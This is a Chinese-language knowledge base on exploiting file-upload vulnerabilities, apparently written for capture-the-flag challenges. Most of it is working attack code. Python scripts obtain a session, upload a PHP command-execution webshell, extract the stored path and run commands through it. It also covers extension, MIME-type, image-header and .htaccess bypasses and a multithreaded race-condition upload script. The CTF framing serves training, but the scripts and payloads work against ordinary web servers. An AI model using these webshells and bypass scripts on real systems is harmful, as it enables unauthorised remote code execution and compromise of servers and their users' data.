# 文件上传漏洞专项知识库

## ⚠️ 最重要的前置步骤

### 必须先获取有效的Cookie/Session

**为什么这很重要？**
```
很多Web应用根据用户的session/cookie来决定文件存储路径：
- /uploads/{user_id}/file.php
- /uploads/{session_id}/file.php
- /uploads/{timestamp}/file.php
- /tmp/{session}/file.php

如果没有有效的cookie：
❌ 文件可能上传到临时目录 (无法访问)
❌ 文件可能上传到其他用户目录 (路径未知)
❌ 文件可能被自动清理
❌ 即使上传成功，也无法找到文件位置
```

### 获取Cookie的方法

#### 方法1: 登录获取 (最常见)
```python
import requests

session = requests.Session()

# 登录获取cookie
login_data = {
    'username': 'test',
    'password': 'test123'
}
response = session.post('http://target.com/login', data=login_data)

# 检查是否登录成功
if 'success' in response.text or response.status_code == 200:
    print(f"[+] 登录成功，Cookie: {session.cookies.get_dict()}")
else:
    print("[-] 登录失败")

# 使用相同session上传文件
files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
upload_response = session.post('http://target.com/upload', files=files)
```

#### 方法2: 注册新用户获取
```python
session = requests.Session()

# 注册新用户
register_data = {
    'username': 'newuser123',
    'password': 'pass123',
    'email': 'test@test.com'
}
session.post('http://target.com/register', data=register_data)

# 登录
session.post('http://target.com/login', data={
    'username': 'newuser123',
    'password': 'pass123'
})

# 上传文件
files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
session.post('http://target.com/upload', files=files)
```

#### 方法3: 访问主页获取Session
```python
session = requests.Session()

# 访问主页，自动获取session cookie
session.get('http://target.com/')

# 检查cookie
print(f"[+] Session Cookie: {session.cookies.get_dict()}")

# 上传文件
files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
session.post('http://target.com/upload', files=files)
```

#### 方法4: 从浏览器复制Cookie
```python
import requests

# 从浏览器开发者工具复制cookie
cookies = {
    'PHPSESSID': 'abc123def456',
    'user_token': 'xyz789'
}

# 使用cookie上传
files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
response = requests.post(
    'http://target.com/upload',
    files=files,
    cookies=cookies
)
```

## 完整的文件上传利用流程

### 标准流程 (推荐)

```python
import requests
import re

# 步骤1: 创建session
session = requests.Session()

# 步骤2: 获取有效cookie (选择一种方法)
# 方法A: 登录
session.post('http://target.com/login', data={'user':'test','pass':'test'})
# 方法B: 注册
session.post('http://target.com/register', data={'user':'newuser','pass':'pass123'})
session.post('http://target.com/login', data={'user':'newuser','pass':'pass123'})
# 方法C: 访问主页
session.get('http://target.com/')

# 步骤3: 准备上传文件
# 尝试不同的绕过技巧
payloads = [
    ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
    ('shell.php.jpg', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
    ('shell.jpg', 'GIF89a<?php system($_GET["cmd"]); ?>', 'image/gif'),
    ('shell.phtml', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
]

# 步骤4: 尝试上传
for filename, content, mime_type in payloads:
    files = {'file': (filename, content, mime_type)}
    response = session.post('http://target.com/upload', files=files)
    
    print(f"[*] 尝试上传: {filename}")
    
    # 步骤5: 从响应中提取文件路径
    # 常见的路径模式
    patterns = [
        r'/uploads/[^"\'<>\s]+',
        r'uploads/[^"\'<>\s]+',
        r'files/[^"\'<>\s]+',
        r'path["\']:\s*["\']([^"\']+)',
        r'url["\']:\s*["\']([^"\']+)',
    ]
    
    file_path = None
    for pattern in patterns:
        match = re.search(pattern, response.text)
        if match:
            file_path = match.group(0) if '/' in match.group(0) else match.group(1)
            break
    
    if file_path:
        print(f"[+] 文件路径: {file_path}")
        
        # 步骤6: 使用相同session访问上传的文件
        shell_url = f'http://target.com/{file_path}?cmd=cat /flag'
        result = session.get(shell_url)
        
        if 'flag{' in result.text or result.status_code == 200:
            print(f"[+] Webshell访问成功!")
            print(result.text)
            break
    else:
        print("[-] 无法从响应中提取文件路径")
        print(f"响应内容: {response.text[:200]}")
```

## 扩展名绕过技巧

### 1. 双扩展名
```
shell.php.jpg
shell.php.png
shell.jsp.jpg
shell.asp.jpg

# Apache可能按从右到左解析
# 如果.jpg不在mime列表，会解析为.php
```

### 2. NULL字节截断 (PHP < 5.3.4)
```
shell.php%00.jpg
shell.php\x00.jpg

# 服务器保存为shell.php，但检测看到的是.jpg
```

### 3. 特殊扩展名
```
# PHP
shell.php3
shell.php4
shell.php5
shell.phtml
shell.pht
shell.phps

# ASP
shell.asp
shell.asa
shell.cer
shell.aspx

# JSP
shell.jsp
shell.jspx
shell.jsw
shell.jsv
```

### 4. 大小写绕过
```
shell.PhP
shell.pHp
shell.Php
shell.phP
shell.PHP
```

### 5. 空格和点号
```
shell.php.
shell.php<space>
shell.php....
shell.php::$DATA (Windows NTFS流)
```

### 6. Apache解析漏洞
```
# Apache从右向左解析，遇到不认识的扩展名跳过
shell.php.xxx
shell.php.test
shell.php.abc
```

## MIME类型绕过

### 伪造Content-Type
```python
# 上传PHP文件，但声称是图片
files = {
    'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')
}

# 常见图片MIME类型
mime_types = [
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/bmp',
    'image/webp',
    'image/svg+xml',
]

# 尝试所有MIME类型
for mime in mime_types:
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', mime)}
    response = requests.post('http://target.com/upload', files=files)
```

## 文件头伪造

### 添加图片文件头
```php
# GIF文件头 (最常用)
GIF89a<?php system($_GET['cmd']); ?>

# PNG文件头
\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>

# JPEG文件头
\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>

# BMP文件头
BM<?php system($_GET['cmd']); ?>
```

### Python实现
```python
# GIF + PHP
content = b'GIF89a' + b'<?php system($_GET["cmd"]); ?>'

# PNG + PHP
content = b'\x89PNG\r\n\x1a\n' + b'<?php system($_GET["cmd"]); ?>'

# JPEG + PHP
content = b'\xFF\xD8\xFF\xE0' + b'<?php system($_GET["cmd"]); ?>'

files = {'file': ('shell.jpg', content, 'image/jpeg')}
session.post('http://target.com/upload', files=files)
```

## .htaccess配置文件上传

### 方法1: 修改解析规则
```apache
# 上传.htaccess文件
content = """
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
"""

files = {'file': ('.htaccess', content, 'text/plain')}
session.post('http://target.com/upload', files=files)

# 然后上传shell.jpg
files = {'file': ('shell.jpg', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')}
session.post('http://target.com/upload', files=files)
```

### 方法2: 针对特定文件
```apache
<FilesMatch "shell.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

## 条件竞争上传

### 场景
```
有些应用先保存文件，检查后删除不合法文件
利用时间窗口在删除前访问文件
```

### 实现
```python
import requests
import threading
import time

session = requests.Session()
session.get('http://target.com/')  # 获取session

flag_found = False
result = None

def upload():
    """持续上传文件"""
    while not flag_found:
        files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
        session.post('http://target.com/upload', files=files)
        time.sleep(0.1)

def access():
    """持续访问文件"""
    global flag_found, result
    while not flag_found:
        try:
            r = session.get('http://target.com/uploads/shell.php?cmd=cat /flag', timeout=1)
            if 'flag{' in r.text:
                result = r.text
                flag_found = True
                print(f"[+] Flag found: {result}")
                break
        except:
            pass

# 启动多个线程
threads = []
threads.append(threading.Thread(target=upload))
threads.append(threading.Thread(target=upload))
threads.append(threading.Thread(target=access))
threads.append(threading.Thread(target=access))

for t in threads:
    t.start()

for t in threads:
    t.join()
```

## 常见错误和解决方案

### 错误1: 文件上传成功但无法访问
```
原因: 没有使用相同的session/cookie
解决: 确保上传和访问使用同一个session对象

❌ 错误做法:
requests.post('http://target.com/upload', files=files)
requests.get('http://target.com/uploads/shell.php')

✅ 正确做法:
session = requests.Session()
session.post('http://target.com/upload', files=files)
session.get('http://target.com/uploads/shell.php')
```

### 错误2: 不知道文件上传到哪里
```
解决方法:
1. 查看上传响应中的路径信息
2. 尝试常见路径: /uploads/, /files/, /images/
3. 查看源码中的上传处理逻辑
4. 使用目录扫描工具
5. 检查是否包含user_id或session_id
```

### 错误3: 文件被自动删除
```
原因: 应用检测到恶意文件并删除
解决: 使用条件竞争，在删除前访问
```

## 文件上传题型解题检查清单

```
□ 1. 是否已获取有效Cookie/Session？
□ 2. 是否使用相同session进行上传和访问？
□ 3. 是否尝试了双扩展名？
□ 4. 是否尝试了MIME类型伪造？
□ 5. 是否添加了文件头？
□ 6. 是否尝试了特殊扩展名？
□ 7. 是否尝试了大小写绕过？
□ 8. 是否尝试了.htaccess上传？
□ 9. 是否从响应中正确提取了文件路径？
□ 10. 是否考虑了条件竞争？
```

## 总结

**文件上传漏洞利用的黄金法则**:
1. ⚠️ **永远先获取Cookie/Session** (最重要!)
2. 使用同一个session对象进行所有操作
3. 按优先级尝试绕过技巧
4. 从响应中提取文件路径
5. 使用相同session访问上传的文件
6. 如果失败，检查是否是路径问题
